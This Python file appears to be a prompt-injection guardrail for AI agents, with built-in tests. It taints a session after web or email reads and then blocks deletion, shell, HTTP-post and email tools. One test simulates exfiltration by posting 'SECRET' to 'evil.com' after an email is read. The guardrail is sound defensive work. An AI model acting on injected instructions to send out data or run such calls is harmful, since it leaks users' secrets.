"""
Simple Prompt Injection Guardrail

Blocks tool calls that appear to be triggered by ACTION directives
from untrusted sources (web pages, emails).
"""

import re

from aicomp_sdk.guardrails.base import Decision, GuardrailBase


class Guardrail(GuardrailBase):
    """Detects and blocks prompt injection attacks using persistent taint tracking"""

    def __init__(self):
        super().__init__()
        self.tainted = False
        self.dangerous_operations = {
            "fs.delete",
            "fs.write",
            "shell.run",
            "http.post",
            "email.send",
        }

    def decide(self, tool_name, tool_args, context):
        """Block dangerous operations after accessing untrusted sources"""

        # Track when we access untrusted content
        recent_sources = context.get("recent_sources", [])
        if recent_sources and recent_sources[-1] in ["web", "email"]:
            if tool_name in ["web.open", "email.read"]:
                self.tainted = True
                print(f"[PROMPT_INJECTION] Session tainted by {tool_name}")

        # If tainted, block all dangerous operations
        if self.tainted and tool_name in self.dangerous_operations:
            return Decision.deny(
                f"Blocked {tool_name} after accessing untrusted content (prompt injection protection)"
            )

        return Decision.allow("safe")


if __name__ == "__main__":
    # Test the guardrail
    print("=" * 70)
    print("PROMPT INJECTION GUARDRAIL TESTS")
    print("=" * 70)

    # Test 1: Normal operation without taint
    print("\n[Test 1] fs.delete without taint:")
    guard = Guardrail()
    decision = guard.decide("fs.delete", {"path": "temp.txt"}, {"recent_sources": []})
    print(f"  Result: {decision.action}")

    # Test 2: Access untrusted content, then dangerous op
    print("\n[Test 2] web.open (taint), then fs.delete:")
    guard = Guardrail()
    guard.decide("web.open", {"id": "demo"}, {"recent_sources": ["web"]})
    decision = guard.decide("fs.delete", {"path": "secret.txt"}, {"recent_sources": ["web"]})
    print(f"  Result: {decision.action}")

    # Test 3: Read email, then http.post (exfiltration)
    print("\n[Test 3] email.read (taint), then http.post:")
    guard = Guardrail()
    guard.decide("email.read", {"id": "msg1"}, {"recent_sources": ["email"]})
    decision = guard.decide(
        "http.post",
        {"url": "evil.com", "data": "SECRET"},
        {"recent_sources": ["email"]},
    )
    print(f"  Result: {decision.action}")

    # Test 4: Web search (no taint), then shell
    print("\n[Test 4] web.search (no taint), then shell.run:")
    guard = Guardrail()
    guard.decide("web.search", {"query": "test"}, {"recent_sources": ["web"]})
    decision = guard.decide("shell.run", {"cmd": "echo test"}, {"recent_sources": ["web"]})
    print(f"  Result: {decision.action}")

    # Test 5: Safe file operation after user command
    print("\n[Test 5] fs.write from user (no web/email):")
    guard = Guardrail()
    decision = guard.decide(
        "fs.write", {"path": "report.txt", "data": "test"}, {"recent_sources": ["user"]}
    )
    print(f"  Result: {decision.action}")

    print("\n" + "=" * 70)
    print("TESTS COMPLETE")
    print("=" * 70)
